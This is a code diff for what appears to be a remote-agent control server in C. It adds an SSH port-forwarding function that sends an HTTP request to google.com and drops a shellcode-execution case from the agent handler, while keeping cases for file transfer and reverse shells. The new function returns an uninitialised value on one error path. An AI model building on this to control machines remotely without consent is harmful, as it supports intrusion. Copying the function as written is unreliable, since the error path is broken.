@@ -576,6 +576,34 @@ int server_get_info(clientDat *manager, char *ptr){
 
 }
 
+int server_direct_forwarding(ssh_session session)
+{
+    ssh_channel forwarding_channel;
+    int rc;
+    char *http_get = "GET / HTTP/1.1\nHost: www.google.com\n\n";
+    int nbytes, nwritten;
+    forwarding_channel = ssh_channel_new(session);
+    if (forwarding_channel == NULL) {
+        return rc;
+    }
+    rc = ssh_channel_open_forward(forwarding_channel,"www.google.com", 80,"localhost", 5555);
+    if (rc != SSH_OK)
+    {
+        ssh_channel_free(forwarding_channel);
+        return rc;
+    }
+    nbytes = strlen(http_get);
+    nwritten = ssh_channel_write(forwarding_channel,http_get,nbytes);
+    if (nbytes != nwritten)
+    {
+        ssh_channel_free(forwarding_channel);
+        return SSH_ERROR;
+    }
+  
+    ssh_channel_free(forwarding_channel);
+    return SSH_OK;
+}
+
 void manager_handler(struct clientNode *node){
     clientDat *manager = node->data;
     char resp[2048];
@@ -799,10 +827,6 @@ void agent_handler(struct clientNode *node){
 
         case AGENT_UP_FILE:
             server_file_download(agent, ptr);
-            break;
-
-        case AGENT_EXEC_SC:
-            printf("Agent shell caught\n");
             break;
 
         case AGENT_REV_SHELL:
